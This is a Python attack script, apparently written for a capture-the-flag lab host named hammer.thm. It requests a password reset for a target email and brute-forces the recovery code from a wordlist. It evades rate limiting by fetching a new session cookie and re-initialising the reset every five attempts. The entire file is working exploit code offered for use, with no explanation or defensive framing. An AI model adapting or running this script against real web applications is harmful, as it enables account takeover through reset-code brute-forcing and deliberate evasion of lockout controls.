import requests
import sys
import time

# Function to get a new PHPSESSID
def get_phpsessid():
    url = "http://hammer.thm:1337/index.php"
    headers = {
        "Host": "hammer.thm:1337",
        "Accept-Language": "en-GB,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    response = requests.get(url, headers=headers)
    if "PHPSESSID" in response.cookies:
        return response.cookies["PHPSESSID"]
    else:
        raise Exception("Failed to retrieve PHPSESSID")

# Function to initialize the session with an email
def initialize_session(phpsessid):
    url = "http://hammer.thm:1337/reset_password.php"
    headers = {
        "Host": "hammer.thm:1337",
        "Content-Length": "25",
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-GB,en;q=0.9",
        "Origin": "http://hammer.thm:1337",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://hammer.thm:1337/reset_password.php",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cookie": f"PHPSESSID={phpsessid}",
    }
    data = {
        "email": "tester@hammer.thm",  # Replace with the target email
    }
    response = requests.post(url, headers=headers, data=data)
    return response.status_code == 200  # Return True if the request was successful

# Function to test a recovery code
def test_recovery_code(recovery_code, phpsessid):
    url = "http://hammer.thm:1337/reset_password.php"
    headers = {
        "Host": "hammer.thm:1337",
        "Content-Length": "24",
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-GB,en;q=0.9",
        "Origin": "http://hammer.thm:1337",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://hammer.thm:1337/reset_password.php",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cookie": f"PHPSESSID={phpsessid}",
    }
    data = {
        "recovery_code": recovery_code,
        "s": "167",
    }
    response = requests.post(url, headers=headers, data=data)
    return response.text

# Main function to enumerate recovery codes
def enumerate_recovery_codes(otp_file):
    valid_codes = []
    attempt_count = 0

    with open(otp_file, "r") as file:
        recovery_codes = file.readlines()

    phpsessid = get_phpsessid()  # Initial PHPSESSID

    # Initialize the session with the email
    if not initialize_session(phpsessid):
        print("Failed to initialize session with email.")
        return valid_codes

    for recovery_code in recovery_codes:
        recovery_code = recovery_code.strip()  # Remove any leading/trailing whitespace
        if recovery_code:
            attempt_count += 1

            # Test the recovery code
            response = test_recovery_code(recovery_code, phpsessid)
            
            if "Invalid or expired recovery code!" not in response:  # Replace with the actual invalid response message
                print(f"[VALID] {recovery_code}")
                valid_codes.append(recovery_code)
                break
            else:
                print(f"[INVALID] {recovery_code}")

            # Update PHPSESSID every 5 attempts
            if attempt_count % 5 == 0:
                print("Updating PHPSESSID...")
                phpsessid = get_phpsessid()
                if not initialize_session(phpsessid):  # Reinitialize the session with the new PHPSESSID
                    print("Failed to reinitialize session with email.")
                    break
                time.sleep(1)  # Add a small delay to avoid rate limiting

    return valid_codes

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <otp_file>")
        sys.exit(1)

    otp_file = sys.argv[1]

    valid_codes = enumerate_recovery_codes(otp_file)

    print("\nValid recovery codes found:")
    for valid_code in valid_codes:
        print(valid_code)
